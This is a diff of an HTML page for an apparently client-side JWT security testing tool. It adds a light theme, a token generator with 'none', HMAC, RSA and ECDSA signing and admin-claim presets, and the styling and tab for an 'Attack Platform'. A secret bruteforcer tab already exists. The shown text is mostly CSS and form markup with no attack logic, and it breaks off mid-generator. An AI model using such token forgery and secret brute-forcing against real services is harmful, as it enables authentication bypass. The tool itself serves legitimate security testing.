@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>JWT Analyzer</title>
+<title>JWT Analyzer – JWT Security Tool</title>
 <link href="profile.jpg" type="image/jpg" rel="shortcut icon" />
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Syne:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -33,6 +33,57 @@
     --display:  'Syne', sans-serif;
     --radius:   6px;
     --shadow:   0 4px 24px rgba(0,0,0,0.6);
+  }
+
+
+  /* ── Light Mode ── */
+  html.light {
+    --bg:       #f0f4f8;
+    --bg2:      #ffffff;
+    --bg3:      #e8edf3;
+    --bg4:      #dce3ec;
+    --border:   #c8d4e0;
+    --border2:  #b0c0d0;
+    --cyan:     #0077aa;
+    --cyan-dim: #005580;
+    --green:    #007a40;
+    --green-dim:#005530;
+    --red:      #c0002a;
+    --red-dim:  #8a0020;
+    --orange:   #c05800;
+    --orange-dim:#8a3e00;
+    --yellow:   #8a7000;
+    --yellow-dim:#6a5500;
+    --text:     #1a2733;
+    --text2:    #4a6070;
+    --text3:    #7a9ab0;
+    --white:    #0d1a24;
+    --shadow:   0 4px 24px rgba(0,0,0,0.12);
+  }
+  html.light body {
+    background-image:
+      radial-gradient(ellipse 80% 40% at 50% -10%, rgba(0,119,170,0.06) 0%, transparent 70%),
+      repeating-linear-gradient(0deg, transparent, transparent 40px, rgba(0,119,170,0.025) 40px, rgba(0,119,170,0.025) 41px);
+  }
+  html.light textarea { color: #1a5580; }
+  html.light pre.json-view { color: var(--text); }
+  html.light .json-key { color: #0055a0; }
+  html.light .json-str { color: #006830; }
+  html.light .json-num { color: #8a4400; }
+  html.light .json-bool { color: #6600aa; }
+  html.light .json-null { color: var(--text3); }
+  html.light .jwt-part-header { color: #c0002a; }
+  html.light .jwt-part-payload { color: #0077aa; }
+  html.light .jwt-part-sig { color: #007a40; }
+  html.light .brute-log { color: var(--text2); }
+  html.light .log-line { color: var(--text3); }
+  html.light .log-line.found { color: var(--green); }
+  html.light .log-line.testing { color: var(--text2); }
+  html.light header { background: rgba(240,244,248,0.94); }
+
+  /* ── Theme transition ── */
+  *, *::before, *::after {
+    transition: background-color 0.25s ease, border-color 0.25s ease, color 0.15s ease;
   }
 
   *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
@@ -679,6 +730,620 @@
   .empty-icon { font-size: 48px; margin-bottom: 12px; opacity: 0.4; }
   .empty-text { font-size: 13px; color: var(--text3); }
 
+
+  /* ── Dark/Light Toggle ── */
+  .theme-toggle {
+    width: 44px; height: 24px;
+    background: var(--bg3);
+    border: 1px solid var(--border2);
+    border-radius: 12px;
+    cursor: pointer;
+    position: relative;
+    flex-shrink: 0;
+    transition: background 0.25s;
+    display: flex;
+    align-items: center;
+    padding: 0 3px;
+    gap: 2px;
+  }
+  .theme-toggle:hover { border-color: var(--cyan-dim); }
+  .toggle-thumb {
+    width: 16px; height: 16px;
+    border-radius: 50%;
+    background: var(--cyan);
+    box-shadow: 0 0 8px rgba(0,229,255,0.4);
+    transition: transform 0.25s cubic-bezier(.4,0,.2,1), background 0.25s;
+    position: absolute;
+    left: 4px;
+  }
+  html.light .toggle-thumb {
+    transform: translateX(20px);
+    background: var(--cyan);
+    box-shadow: 0 0 8px rgba(0,119,170,0.3);
+  }
+  .toggle-icon { font-size: 10px; position: absolute; }
+  .toggle-icon.moon { left: 5px; }
+  .toggle-icon.sun  { right: 5px; }
+
+
+  /* ════════════════ JWT Generator ════════════════ */
+  .jg-layout {
+    display: grid;
+    grid-template-columns: 320px 1fr;
+    gap: 16px;
+    align-items: start;
+  }
+  @media (max-width: 880px) { .jg-layout { grid-template-columns: 1fr; } }
+
+  .jg-card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    overflow: hidden;
+    margin-bottom: 12px;
+  }
+  .jg-card-hdr {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 9px 14px;
+    background: var(--bg3);
+    border-bottom: 1px solid var(--border);
+    font-size: 11px;
+    font-weight: 700;
+    color: var(--text);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+  .jg-card-body { padding: 14px; }
+  .jg-card-body.jg-no-pad { padding: 0; }
+
+  .jg-hdr-btn {
+    padding: 3px 10px;
+    background: transparent;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    color: var(--text2);
+    font-family: var(--mono);
+    font-size: 10px;
+    cursor: pointer;
+    transition: all 0.15s;
+    text-transform: none;
+    letter-spacing: 0;
+    font-weight: 500;
+  }
+  .jg-hdr-btn:hover { border-color: var(--cyan-dim); color: var(--cyan); }
+
+  /* Algorithm grid */
+  .jg-alg-grid {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 6px;
+    margin-bottom: 10px;
+  }
+  .jg-alg-btn {
+    padding: 8px 6px;
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    color: var(--text2);
+    font-family: var(--mono);
+    font-size: 11px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.15s;
+    text-align: center;
+  }
+  .jg-alg-btn:hover { border-color: var(--border2); color: var(--text); }
+  .jg-alg-btn.active { border-color: var(--cyan); color: var(--cyan); background: rgba(0,229,255,0.08); }
+  .jg-alg-btn[data-alg="none"].active { border-color: var(--red); color: var(--red); background: rgba(255,59,92,0.08); }
+  .jg-alg-btn[data-alg^="RS"].active { border-color: var(--orange); color: var(--orange); background: rgba(255,145,0,0.08); }
+  .jg-alg-btn[data-alg^="ES"].active { border-color: var(--green); color: var(--green); background: rgba(0,255,136,0.08); }
+  .jg-alg-desc {
+    font-size: 10px;
+    color: var(--text3);
+    font-style: italic;
+    text-align: center;
+    padding: 4px 0;
+  }
+
+  /* Inputs */
+  .jg-input {
+    width: 100%;
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: 12px;
+    padding: 8px 36px 8px 12px;
+    border-radius: var(--radius);
+    outline: none;
+    transition: border-color 0.2s;
+  }
+  .jg-input:focus { border-color: var(--cyan-dim); }
+  .jg-textarea {
+    width: 100%;
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: 12px;
+    padding: 10px 12px;
+    border-radius: var(--radius);
+    outline: none;
+    resize: vertical;
+    transition: border-color 0.2s;
+  }
+  .jg-textarea:focus { border-color: var(--cyan-dim); }
+  .jg-key-area { min-height: 80px; font-size: 10px; line-height: 1.6; }
+  .jg-json-editor {
+    width: 100%;
+    background: var(--bg2);
+    border: none;
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: 12px;
+    padding: 14px 16px;
+    outline: none;
+    resize: vertical;
+    line-height: 1.7;
+    min-height: 120px;
+  }
+  .jg-red-text { color: #e0607a; }
+  html.light .jg-red-text { color: #b0002a; }
+  .jg-cyan-text { color: var(--cyan); }
+  html.light .jg-cyan-text { color: var(--cyan); }
+
+  .jg-json-err {
+    padding: 8px 14px;
+    font-size: 10px;
+    color: var(--red);
+    background: rgba(255,59,92,0.06);
+    border-top: 1px solid var(--red-dim);
+  }
+
+  .jg-secret-wrap { position: relative; }
+  .jg-eye-btn {
+    position: absolute; right: 8px; top: 50%;
+    transform: translateY(-50%);
+    background: none; border: none; cursor: pointer;
+    font-size: 14px; color: var(--text3); padding: 0;
+  }
+  .jg-eye-btn:hover { color: var(--text2); }
+
+  .jg-strength-row {
+    display: flex; align-items: center; gap: 8px; margin-top: 8px;
+  }
+  .jg-strength-bar-bg {
+    flex: 1; background: var(--bg3); border-radius: 3px; height: 4px;
+    overflow: hidden; border: 1px solid var(--border);
+  }
+  .jg-strength-bar { height: 100%; border-radius: 3px; transition: width 0.3s, background 0.3s; width: 0; }
+  .jg-strength-lbl { font-size: 10px; font-weight: 700; min-width: 44px; text-align: right; color: var(--text3); }
+
+  .jg-hint {
+    background: rgba(255,145,0,0.06);
+    border: 1px solid var(--orange-dim);
+    border-radius: var(--radius);
+    padding: 8px 12px;
+    font-size: 11px;
+    color: var(--text2);
+    line-height: 1.6;
+  }
+  .jg-hint b { color: var(--orange); }
+
+  .jg-field { margin-bottom: 10px; }
+  .jg-label { display: block; font-size: 10px; color: var(--text2); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 5px; }
+
+  .jg-key-info {
+    margin-top: 8px; padding: 8px 10px;
+    background: rgba(0,255,136,0.05); border: 1px solid var(--green-dim);
+    border-radius: var(--radius); font-size: 10px; color: var(--green); line-height: 1.7;
+  }
+
+  /* Claim quick-add pills */
+  .jg-claims-row {
+    display: flex; align-items: center; flex-wrap: wrap; gap: 6px;
+    margin-bottom: 2px;
+  }
+  .jg-claims-label { font-size: 10px; color: var(--text3); text-transform: uppercase; letter-spacing: 1px; flex-shrink: 0; }
+  .jg-claim-pill-btn {
+    padding: 3px 10px;
+    background: var(--bg3); border: 1px solid var(--border);
+    border-radius: 20px; color: var(--cyan);
+    font-family: var(--mono); font-size: 10px; font-weight: 600;
+    cursor: pointer; transition: all 0.15s;
+  }
+  .jg-claim-pill-btn:hover { border-color: var(--cyan-dim); background: rgba(0,229,255,0.06); }
+  .jg-preset-pill {
+    padding: 3px 10px;
+    background: var(--bg3); border: 1px solid var(--border);
+    border-radius: 20px; color: var(--text2);
+    font-family: var(--mono); font-size: 10px;
+    cursor: pointer; transition: all 0.15s;
+  }
+  .jg-preset-pill:hover { border-color: var(--border2); color: var(--text); }
+
+  /* Generate button */
+  .jg-generate-btn {
+    width: 100%; padding: 12px;
+    background: linear-gradient(135deg, var(--cyan-dim), #005580);
+    border: 1px solid var(--cyan-dim);
+    border-radius: var(--radius); color: var(--white);
+    font-family: var(--mono); font-size: 13px; font-weight: 700;
+    letter-spacing: 1px; cursor: pointer;
+    transition: all 0.2s; margin-bottom: 14px;
+    text-transform: uppercase;
+  }
+  .jg-generate-btn:hover {
+    background: linear-gradient(135deg, var(--cyan), var(--cyan-dim));
+    box-shadow: 0 0 20px rgba(0,229,255,0.25); transform: translateY(-1px);
+  }
+
+  /* Token output */
+  .jg-token-visual {
+    padding: 12px 14px;
+    background: var(--bg3); border: 1px solid var(--border);
+    border-radius: var(--radius); font-size: 11px;
+    word-break: break-all; line-height: 2;
+    cursor: pointer; transition: border-color 0.2s;
+    margin-bottom: 12px; min-height: 50px;
+  }
+  .jg-token-visual:hover { border-color: var(--cyan-dim); }
+
+  .jg-stats-row { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 12px; }
+  .jg-stat-pill {
+    flex: 1; min-width: 80px;
+    background: var(--bg3); border: 1px solid var(--border);
+    border-radius: var(--radius); padding: 6px 10px; text-align: center;
+  }
+  .jg-stat-k { display: block; font-size: 9px; color: var(--text3); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 2px; }
+  .jg-stat-v { font-size: 11px; font-weight: 700; color: var(--cyan); }
+
+  .jg-decoded-grid {
+    display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 12px;
+  }
+  @media (max-width: 680px) { .jg-decoded-grid { grid-template-columns: 1fr; } }
+  .jg-decoded-pre {
+    background: var(--bg3); border: 1px solid var(--border);
+    border-radius: var(--radius); padding: 10px 12px;
+    font-size: 10px; white-space: pre-wrap; word-break: break-word;
+    line-height: 1.7; max-height: 200px; overflow-y: auto; color: var(--text2);
+  }
+
+  /* Verify */
+  .jg-verify-btn {
+    width: 100%; padding: 9px;
+    background: var(--bg3); border: 1px solid var(--border);
+    border-radius: var(--radius); color: var(--text2);
+    font-family: var(--mono); font-size: 11px; font-weight: 600;
+    cursor: pointer; transition: all 0.18s; margin-top: 8px;
+  }
+  .jg-verify-btn:hover { border-color: var(--green-dim); color: var(--green); }
+  .jg-verify-result {
+    margin-top: 8px; padding: 10px 12px;
+    border-radius: var(--radius); font-size: 11px; font-weight: 600; line-height: 1.5;
+  }
+  .jg-verify-ok { background: rgba(0,255,136,0.07); border: 1px solid var(--green-dim); color: var(--green); }
+  .jg-verify-fail { background: rgba(255,59,92,0.07); border: 1px solid var(--red-dim); color: var(--red); }
+
+  /* ════════════════ Attack Platform ════════════════ */
+  .atk-layout {
+    display: grid;
+    grid-template-columns: 340px 1fr;
+    gap: 16px;
+    align-items: start;
+  }
+  @media (max-width: 900px) { .atk-layout { grid-template-columns: 1fr; } }
+
+  .atk-sidebar {
+    position: sticky;
+    top: 90px;
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+  }
+
+  .atk-token-card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    overflow: hidden;
+  }
+  .atk-token-header {
+    padding: 10px 14px;
+    background: var(--bg3);
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+  .atk-token-title {
+    font-size: 11px;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    color: var(--text2);
+  }
+  .atk-token-card textarea {
+    min-height: 90px;
+    font-size: 11px;
+    color: var(--cyan);
+  }
+
+  .atk-module-nav {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    overflow: hidden;
+  }
+  .atk-module-nav-title {
+    padding: 8px 14px;
+    background: var(--bg3);
+    border-bottom: 1px solid var(--border);
+    font-size: 10px;
+    font-weight: 700;
+    color: var(--text3);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+  .atk-nav-item {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    padding: 9px 14px;
+    cursor: pointer;
+    border-bottom: 1px solid var(--border);
+    transition: background 0.15s;
+    text-decoration: none;
+  }
+  .atk-nav-item:last-child { border-bottom: none; }
+  .atk-nav-item:hover { background: var(--bg3); }
+  .atk-nav-item.active { background: rgba(0,229,255,0.06); border-left: 3px solid var(--cyan); }
+  html.light .atk-nav-item.active { background: rgba(0,119,170,0.06); border-left: 3px solid var(--cyan); }
+  .atk-nav-icon { font-size: 16px; flex-shrink: 0; width: 24px; text-align: center; }
+  .atk-nav-label { font-size: 12px; font-weight: 600; color: var(--text); }
+  .atk-nav-badge {
+    margin-left: auto;
+    font-size: 9px;
+    font-weight: 700;
+    letter-spacing: 1px;
+    padding: 2px 7px;
+    border-radius: 3px;
+    text-transform: uppercase;
+    flex-shrink: 0;
+  }
+  .badge-critical { background: rgba(255,59,92,0.15); color: var(--red); border: 1px solid var(--red-dim); }
+  .badge-high { background: rgba(255,145,0,0.12); color: var(--orange); border: 1px solid var(--orange-dim); }
+  .badge-medium { background: rgba(255,224,51,0.10); color: var(--yellow); border: 1px solid var(--yellow-dim); }
+
+  /* ── Attack Module Panels ── */
+  .atk-panel { display: none; }
+  .atk-panel.active { display: block; }
+
+  .atk-module-card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    overflow: hidden;
+    margin-bottom: 14px;
+  }
+  .atk-module-header {
+    padding: 14px 18px;
+    background: var(--bg3);
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: flex-start;
+    gap: 14px;
+  }
+  .atk-module-icon { font-size: 28px; flex-shrink: 0; }
+  .atk-module-meta { flex: 1; }
+  .atk-module-name {
+    font-family: var(--display);
+    font-size: 16px;
+    font-weight: 700;
+    color: var(--white);
+    margin-bottom: 3px;
+    letter-spacing: -0.3px;
+  }
+  .atk-module-desc { font-size: 11px; color: var(--text2); line-height: 1.6; }
+  .atk-module-body { padding: 16px 18px; }
+
+  .atk-section-label {
+    font-size: 10px;
+    color: var(--text3);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-bottom: 6px;
+    margin-top: 14px;
+  }
+  .atk-section-label:first-child { margin-top: 0; }
+
+  .atk-how-it-works {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 12px 14px;
+    font-size: 11px;
+    color: var(--text2);
+    line-height: 1.8;
+    margin-bottom: 14px;
+  }
+  .atk-how-it-works ol { padding-left: 18px; }
+  .atk-how-it-works li { margin-bottom: 4px; }
+  .atk-how-it-works code {
+    background: var(--bg4);
+    border: 1px solid var(--border);
+    border-radius: 3px;
+    padding: 1px 5px;
+    color: var(--cyan);
+    font-size: 10px;
+  }
+
+  .atk-variants {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 7px;
+    margin-bottom: 14px;
+  }
+  .atk-variant-btn {
+    padding: 5px 14px;
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    color: var(--text2);
+    font-family: var(--mono);
+    font-size: 11px;
+    cursor: pointer;
+    transition: all 0.18s;
+  }
+  .atk-variant-btn:hover { border-color: var(--orange-dim); color: var(--orange); }
+  .atk-variant-btn.sel { border-color: var(--orange); color: var(--orange); background: rgba(255,145,0,0.08); }
+
+  .atk-field { margin-bottom: 12px; }
+  .atk-field label {
+    display: block;
+    font-size: 10px;
+    color: var(--text2);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-bottom: 5px;
+  }
+  .atk-field input, .atk-field textarea, .atk-field select {
+    width: 100%;
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: 12px;
+    padding: 8px 12px;
+    border-radius: var(--radius);
+    outline: none;
+    transition: border-color 0.2s;
+  }
+  .atk-field input:focus, .atk-field textarea:focus { border-color: var(--orange-dim); }
+  .atk-field textarea { min-height: 80px; resize: vertical; }
+
+  .atk-run-btn {
+    width: 100%;
+    padding: 11px;
+    background: linear-gradient(135deg, rgba(255,59,92,0.25), rgba(255,145,0,0.15));
+    border: 1px solid var(--red-dim);
+    border-radius: var(--radius);
+    color: var(--white);
+    font-family: var(--mono);
+    font-size: 12px;
+    font-weight: 700;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    cursor: pointer;
+    transition: all 0.2s;
+    margin-top: 14px;
+  }
+  .atk-run-btn:hover {
+    background: linear-gradient(135deg, rgba(255,59,92,0.4), rgba(255,145,0,0.25));
+    border-color: var(--red);
+    box-shadow: 0 0 18px rgba(255,59,92,0.2);
+    transform: translateY(-1px);
+  }
+
+  /* ── Attack Result ── */
+  .atk-result {
+    display: none;
+    margin-top: 14px;
+    animation: fadeIn 0.3s ease;
+  }
+  .atk-result.show { display: block; }
+  .atk-result-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 8px;
+  }
+  .atk-result-label { font-size: 10px; color: var(--text3); text-transform: uppercase; letter-spacing: 1px; }
+  .atk-result-actions { display: flex; gap: 6px; }
+
+  .atk-token-out {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 12px 14px;
+    font-size: 11px;
+    word-break: break-all;
+    line-height: 1.9;
+    cursor: pointer;
+    transition: border-color 0.2s;
+    min-height: 50px;
+  }
+  .atk-token-out:hover { border-color: var(--orange-dim); }
+
+  .atk-what-to-look {
+    background: rgba(255,145,0,0.05);
+    border: 1px solid var(--orange-dim);
+    border-radius: var(--radius);
+    padding: 12px 14px;
+    font-size: 11px;
+    color: var(--text2);
+    line-height: 1.7;
+    margin-top: 10px;
+  }
+  .atk-what-to-look strong { color: var(--orange); }
+  .atk-what-to-look ul { padding-left: 16px; margin-top: 5px; }
+  .atk-what-to-look li { margin-bottom: 3px; }
+
+  .atk-success-banner {
+    background: rgba(0,255,136,0.06);
+    border: 1px solid var(--green-dim);
+    border-radius: var(--radius);
+    padding: 10px 14px;
+    font-size: 11px;
+    color: var(--green);
+    margin-top: 8px;
+    font-weight: 600;
+  }
+
+  .atk-tab-hint {
+    background: rgba(0,229,255,0.04);
+    border: 1px solid var(--cyan-dim);
+    border-radius: var(--radius);
+    padding: 10px 14px;
+    font-size: 11px;
+    color: var(--text2);
+    margin-bottom: 16px;
+    line-height: 1.7;
+  }
+  .atk-tab-hint strong { color: var(--cyan); }
+
+  .atk-diff-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 11px;
+    margin-top: 10px;
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    overflow: hidden;
+  }
+  .atk-diff-table th {
+    background: var(--bg4);
+    padding: 7px 12px;
+    text-align: left;
+    font-size: 10px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    color: var(--text3);
+    border-bottom: 1px solid var(--border);
+  }
+  .atk-diff-table td {
+    padding: 7px 12px;
+    border-bottom: 1px solid var(--border);
+    vertical-align: top;
+    line-height: 1.6;
+  }
+  .atk-diff-table tr:last-child td { border-bottom: none; }
+  .diff-before { color: var(--red); }
+  .diff-after  { color: var(--green); }
+  .diff-key    { color: var(--cyan); }
+
   /* ── Scrollbar ── */
   ::-webkit-scrollbar { width: 6px; height: 6px; }
   ::-webkit-scrollbar-track { background: var(--bg2); }
@@ -766,7 +1431,13 @@
     <div class="logo-text">JWT Analyzer</div>
     <div class="logo-sub">JWT Security Testing Tool</div>
   </div>
-  <div class="header-badge">100% Client-Side</div>
+  <div style="margin-left:auto;display:flex;align-items:center;gap:12px">
+    <button class="theme-toggle" onclick="toggleTheme()" title="Toggle light/dark mode" aria-label="Toggle theme">
+      <span class="toggle-icon moon">🌙</span>
+      <span class="toggle-icon sun">☀️</span>
+      <span class="toggle-thumb"></span>
+    </button>
+  </div>
 </header>
 
 <div class="container">
@@ -775,6 +1446,8 @@
     <button class="main-tab active" onclick="switchTab('decoder')">🔍 Decoder &amp; Analyzer</button>
     <button class="main-tab" onclick="switchTab('bruteforce')">⚡ Secret Bruteforcer</button>
     <button class="main-tab" onclick="switchTab('editor')">✏️ JWT Editor</button>
+    <button class="main-tab" onclick="switchTab('generator')">⚙️ JWT Generator</button>
+    <button class="main-tab" onclick="switchTab('attack')">⚔️ Attack Platform</button>
     <button class="main-tab" onclick="switchTab('checklist')">📋 Security Checklist</button>
   </div>
 
@@ -969,96 +1642,968 @@
     </div>
   </div>
 
+
+  <!-- ════════════════════════════════════
+       TAB 5 — JWT Generator
+       ════════════════════════════════════ -->
+  <div class="tab-panel" id="tab-generator">
+    <p class="section-sub">Build JWT tokens from scratch — supports HMAC, RSA, and ECDSA signing. Generate real RSA-2048 key pairs in-browser, add standard claims with one click, and verify tokens instantly.</p>
+
+    <div class="jg-layout">
+
+      <!-- ══ LEFT PANEL ══ -->
+      <div class="jg-left">
+
+        <!-- Algorithm -->
+        <div class="jg-card">
+          <div class="jg-card-hdr"><span>Algorithm</span></div>
+          <div class="jg-card-body">
+            <div class="jg-alg-grid" id="jgAlgGrid">
+              <button class="jg-alg-btn" data-alg="none"   onclick="jgSetAlg('none',this)">none</button>
+              <button class="jg-alg-btn active" data-alg="HS256" onclick="jgSetAlg('HS256',this)">HS256</button>
+              <button class="jg-alg-btn" data-alg="HS384" onclick="jgSetAlg('HS384',this)">HS384</button>
+              <button class="jg-alg-btn" data-alg="HS512" onclick="jgSetAlg('HS512',this)">HS512</button>
+              <button class="jg-alg-btn" data-alg="RS256" onclick="jgSetAlg('RS256',this)">RS256</button>
+              <button class="jg-alg-btn" data-alg="RS384" onclick="jgSetAlg('RS384',this)">RS384</button>
+              <button class="jg-alg-btn" data-alg="RS512" onclick="jgSetAlg('RS512',this)">RS512</button>
+              <button class="jg-alg-btn" data-alg="ES256" onclick="jgSetAlg('ES256',this)">ES256</button>
+              <button class="jg-alg-btn" data-alg="ES384" onclick="jgSetAlg('ES384',this)">ES384</button>
+              <button class="jg-alg-btn" data-alg="ES512" onclick="jgSetAlg('ES512',this)">ES512</button>
+            </div>
+            <div class="jg-alg-desc" id="jgAlgDesc">HMAC SHA-256 — symmetric shared secret signing</div>
+          </div>
+        </div>
+
+        <!-- HMAC Secret -->
+        <div class="jg-card" id="jgHmacCard">
+          <div class="jg-card-hdr">
+            <span>Secret Key</span>
+            <button class="jg-hdr-btn" onclick="jgGenSecret()">⚡ Generate</button>
+          </div>
+          <div class="jg-card-body">
+            <div class="jg-secret-wrap">
+              <input type="password" id="jgSecret" class="jg-input" placeholder="Enter HMAC secret key..." oninput="jgCheckStrength()" autocomplete="off">
+              <button class="jg-eye-btn" onclick="jgToggleSecretVis()" title="Toggle visibility">👁</button>
+            </div>
+            <div class="jg-strength-row" id="jgStrengthRow">
+              <div class="jg-strength-bar-bg"><div class="jg-strength-bar" id="jgStrengthBar"></div></div>
+              <span class="jg-strength-lbl" id="jgStrengthLbl">—</span>
+            </div>
+            <div class="jg-hint" id="jgNoneHint" style="display:none">
+              ⚠️ <b>alg:none</b> — No signature will be generated. Token integrity cannot be verified.
+            </div>
+          </div>
+        </div>
+
+        <!-- RSA/EC Keys -->
+        <div class="jg-card" id="jgAsymCard" style="display:none">
+          <div class="jg-card-hdr">
+            <span id="jgKeyCardTitle">RSA Private Key</span>
+            <button class="jg-hdr-btn" onclick="jgGenKeyPair()" id="jgGenKeyBtn">⚡ Generate Pair</button>
+          </div>
+          <div class="jg-card-body">
+            <div class="jg-field">
+              <label class="jg-label">Private Key <span style="color:var(--text3)">(PEM format — for signing)</span></label>
+              <textarea id="jgPrivKey" class="jg-textarea jg-key-area" placeholder="-----BEGIN PRIVATE KEY-----&#10;Paste RSA/EC private key here, or click Generate Pair above&#10;-----END PRIVATE KEY-----" rows="6"></textarea>
+            </div>
+            <div class="jg-field">
+              <label class="jg-label">Public Key <span style="color:var(--text3)">(PEM format — for verification)</span></label>
+              <textarea id="jgPubKey" class="jg-textarea jg-key-area" placeholder="-----BEGIN PUBLIC KEY-----&#10;Auto-filled after generating key pair&#10;-----END PUBLIC KEY-----" rows="4" readonly></textarea>
+            </div>
+            <div class="jg-key-info" id="jgKeyInfo" style="display:none"></div>
+          </div>
+        </div>
+
+        <!-- Verify Section -->
+        <div class="jg-card">
+          <div class="jg-card-hdr"><span>Verify Signature</span></div>
+          <div class="jg-card-body">
+            <div class="jg-hint" style="margin-bottom:10px">Test if a secret/key correctly verifies the generated token.</div>
+            <div class="jg-field">
+              <label class="jg-label" id="jgVerifyKeyLabel">Secret Key (for HMAC)</label>
+              <input type="text" id="jgVerifySecret" class="jg-input" placeholder="Enter secret or paste public key PEM...">
+            </div>
+            <button class="jg-verify-btn" onclick="jgVerify()">✔ Verify Signature</button>
+            <div class="jg-verify-result" id="jgVerifyResult" style="display:none"></div>
+          </div>
+        </div>
+
+      </div><!-- /left -->
+
+      <!-- ══ RIGHT PANEL ══ -->
+      <div class="jg-right">
+
+        <!-- Header editor -->
+        <div class="jg-card">
+          <div class="jg-card-hdr">
+            <span><span style="color:var(--red)">■</span> Header</span>
+            <button class="jg-hdr-btn" onclick="jgResetHeader()">Reset</button>
+          </div>
+          <div class="jg-card-body jg-no-pad">
+            <textarea id="jgHeaderJson" class="jg-json-editor jg-red-text" spellcheck="false" oninput="jgLiveUpdate()" rows="5">{"alg": "HS256", "typ": "JWT"}</textarea>
+          </div>
+        </div>
+
+        <!-- Payload editor -->
+        <div class="jg-card">
+          <div class="jg-card-hdr">
+            <span><span style="color:var(--cyan)">■</span> Payload</span>
+            <div style="display:flex;gap:6px;align-items:center">
+              <button class="jg-hdr-btn" onclick="jgFormatJson('jgPayloadJson')">Format</button>
+              <button class="jg-hdr-btn" onclick="jgClearPayload()">Clear</button>
+            </div>
+          </div>
+          <div class="jg-card-body">
+            <!-- Quick claim buttons -->
+            <div class="jg-claims-row">
+              <span class="jg-claims-label">Add Claim:</span>
+              <button class="jg-claim-pill-btn" onclick="jgAddClaim('sub')">sub</button>
+              <button class="jg-claim-pill-btn" onclick="jgAddClaim('iss')">iss</button>
+              <button class="jg-claim-pill-btn" onclick="jgAddClaim('aud')">aud</button>
+              <button class="jg-claim-pill-btn" onclick="jgAddClaim('exp')">exp</button>
+              <button class="jg-claim-pill-btn" onclick="jgAddClaim('nbf')">nbf</button>
+              <button class="jg-claim-pill-btn" onclick="jgAddClaim('iat')">iat</button>
+              <button class="jg-claim-pill-btn" onclick="jgAddClaim('jti')">jti</button>
+              <button class="jg-claim-pill-btn" onclick="jgAddClaim('name')">name</button>
+              <button class="jg-claim-pill-btn" onclick="jgAddClaim('email')">email</button>
+              <button class="jg-claim-pill-btn" onclick="jgAddClaim('role')">role</button>
+              <button class="jg-claim-pill-btn" onclick="jgAddClaim('scope')">scope</button>
+            </div>
+            <!-- Presets -->
+            <div class="jg-claims-row" style="margin-top:6px">
+              <span class="jg-claims-label">Presets:</span>
+              <button class="jg-preset-pill" onclick="jgLoadPreset('user')">👤 User</button>
+              <button class="jg-preset-pill" onclick="jgLoadPreset('admin')">🛡 Admin</button>
+              <button class="jg-preset-pill" onclick="jgLoadPreset('service')">⚙️ Service</button>
+              <button class="jg-preset-pill" onclick="jgLoadPreset('oidc')">🔑 OIDC</button>
+              <button class="jg-preset-pill" onclick="jgLoadPreset('api')">🌐 API</button>
+              <button class="jg-preset-pill" onclick="jgLoadPreset('minimal')">✦ Minimal</button>
+            </div>
+          </div>
+          <div class="jg-card-body jg-no-pad">
+            <textarea id="jgPayloadJson" class="jg-json-editor jg-cyan-text" spellcheck="false" oninput="jgLiveUpdate()" rows="12">{
+  "sub": "1234567890",
+  "name": "John Doe",
+  "iat": 1516239022
+}</textarea>
+          </div>
+          <div class="jg-json-err" id="jgPayloadErr" style="display:none"></div>
+        </div>
+
+        <!-- Generate button -->
+        <button class="jg-generate-btn" onclick="jgGenerate()">⚙️ Generate JWT</button>
+
+        <!-- Output token -->
+        <div class="jg-card" id="jgOutputCard" style="display:none">
+          <div class="jg-card-hdr">
+            <span>Generated Token</span>
+            <div style="display:flex;gap:6px">
+              <button class="jg-hdr-btn" onclick="jgCopyToken()">📋 Copy</button>
+              <button class="jg-hdr-btn" onclick="jgSendToDecoder()">→ Decoder</button>
